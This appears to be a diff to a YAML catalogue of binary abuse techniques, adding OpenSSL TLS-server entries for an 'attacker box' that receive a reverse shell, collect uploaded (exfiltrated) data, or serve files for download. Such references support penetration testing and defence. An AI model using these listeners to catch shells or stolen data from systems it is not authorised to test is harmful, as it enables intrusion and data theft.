@@ -30,6 +30,11 @@ reverse-shell:
       tcp-server:
         comment: A TCP server can be used on the attacker box to receive the shell.
         code: nc -l -p 12345
+      tls-server:
+        comment: A TLS server can be used on the attacker box to receive the shell.
+        code: |-
+          openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+          openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
 
 bind-shell:
   label: Bind shell
@@ -87,6 +92,11 @@ upload:
         code: python -m pyftpdlib -w -p 21
       ssh-server:
         comment: An SSH server can be used on the attacker box to receive the data.
+      tls-server:
+        comment: A TLS server can be used on the attacker box to receive the data.
+        code: |-
+          openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+          openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 >/path/to/output-file
 
 download:
   label: Download
@@ -113,6 +123,11 @@ download:
         code: python -m pyftpdlib -w -p 21
       ssh-server:
         comment: An SSH server can be used on the attacker box to send the data.
+      tls-server:
+        comment: A TLS server can be used on the attacker box to send the data.
+        code: |-
+          openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+          openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file
 
 library-load:
   label: Library load
